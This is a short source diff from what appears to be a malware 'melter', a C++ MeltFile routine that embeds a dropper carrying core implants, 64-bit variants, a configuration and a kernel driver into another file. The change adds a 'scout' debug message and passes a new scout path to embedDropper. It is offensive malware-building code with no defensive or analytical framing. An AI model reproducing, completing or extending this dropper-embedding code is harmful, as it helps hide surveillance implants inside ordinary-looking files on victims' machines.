@@ -92,6 +92,7 @@ int MeltFile( char const * const input_path, char const * const output_path, Mel
 	}
 	else
 	{
+		printf("[+] This is a scout\n");
 		bf::path core_path = melter_data->core;
 		bf::path core64_path = melter_data->core64;
 		bf::path conf_path = melter_data->conf;
@@ -99,7 +100,9 @@ int MeltFile( char const * const input_path, char const * const output_path, Mel
 		bf::path driver_path = melter_data->driver ? melter_data->driver : "";
 		bf::path driver64_path = melter_data->driver64 ? melter_data->driver64 : "";
 		bf::path bitmap_path = melter_data->demoBitmap ? melter_data->demoBitmap : "";
+		bf::path scout_path = "";
 
+		
 		try {
 			object->embedDropper(core_path, 
 				core64_path, 
@@ -112,7 +115,7 @@ int MeltFile( char const * const input_path, char const * const output_path, Mel
 				melter_data->fprefix,
 				bitmap_path,
 				FALSE,
-				NULL);
+				scout_path);
 		} catch (std::exception& e) {
 			throw melting_error(e.what()) ;
 		}
